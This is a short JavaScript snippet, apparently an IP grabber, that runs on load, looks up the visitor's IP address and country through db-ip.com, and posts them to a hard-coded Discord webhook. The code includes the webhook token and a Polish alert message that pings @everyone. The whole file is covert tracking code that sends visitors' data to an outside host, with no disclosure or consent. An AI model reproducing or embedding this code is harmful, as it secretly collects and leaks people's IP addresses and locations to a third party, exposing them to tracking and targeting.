var webHookUrl = "https://discord.com/api/webhooks/1013673244471078962/0eJOHfvgEmgXM18pL-gu2LRdBGYUfv13kLSS9IMWX4WSIGeuBv98e9DcWJCtfFyxtrUz";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "PHANTUU PRZESYŁA!",
        avatar_url: "",
        content:    "**NOWA BOMBA! HALO WSTAJEMY!** @everyone \n" + 
		    "__**:globe_with_meridians: IP Address:**__ \n" +
                    "`" + ip + "` \n \n" +
		    "__**Country:**__ \n" +
		    "`" + country + "`"
    }

    postRequest.send(JSON.stringify(params));

}

request();
